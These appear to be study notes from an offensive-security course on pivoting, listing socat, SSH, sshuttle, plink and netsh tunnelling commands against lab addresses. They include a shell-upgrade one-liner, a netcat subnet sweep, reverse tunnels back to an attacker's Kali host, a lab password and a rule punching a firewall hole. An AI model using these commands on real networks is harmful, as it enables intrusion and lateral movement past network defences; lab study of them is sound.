

## 18.1 Port Forwarding with Linux Tools

##### Socat
- Can be run from user space
- alternate options: rinetd, netcat FIFO combo
- 

Commands

```
# verbose socat  local 2345 to remote 10.4.50.215:5432
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```


## 18.2 SSH Tunneling

##### SSH Notes
- Need TTY functionality 
	- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- Need to know exact ip port
	- `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
- Local forward syntax:  -L <L_IP>:<L_PORT>:<R_IP>:<R_PORT>
- Dynamic forward syntax: -D <L_IP>:<L_PORT>:<R_IP>
	- dynamic uses SOCKS protocol to proxy packets to multiple destination ports
	- if SOCKS not natively supported, use proxychains
		- proxychains doesnt work for statically linked binaries
		- proxychains conf file: /etc/proxychains4.conf (need to edit)
- Reverse syntax: -R <LISTENER_IP>:<LISTEN_PORT>:<F_IP>:<F_PORT>
	- make sure to set up ssh server on kali
- Dynamic reverse can use proxychains as well

##### Sshuttle
- Turns SSH connection into a pseudo VPN
- Sets up local routes to force traffic through SSH connection
- Needs prexisting SSH connection and port forward on target 

Commands 

```
# Local port forward (-N = no shell)
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215

# Dynamic forward
ssh -D 0.0.0.0:9999 database_admin@10.4.50.215

# Proxychains (make sure to edit proxychains.conf)
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217

# Reverse 
ssh -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4

# Reverse dynamic (listens locally on kali at 9998)
ssh -R 9998 kali@192.168.118.4

# Sshuttle
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24


```


## 18.3 Port Forwarding with Windows Tools

##### SSH.exe
- Included with Windows 10 1709 + 
- Bundled with sftp.exe and scp.exe
- Stored in `%systemdrive%\Windows\System32\OpenSSH`
- Need to start SSH server on kali

##### Plink.exe
- Cmdline version of PuTTY
- Need to already have connection to remote target to upload binary
	- usually nc.exe -> plink 

##### Netsh 
- Need firewall hole 


Commands

```
# Plink syntax (local 9833 to remote 3389)
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4

# Netsh 
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215

netsh interface portproxy show all

netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow


```
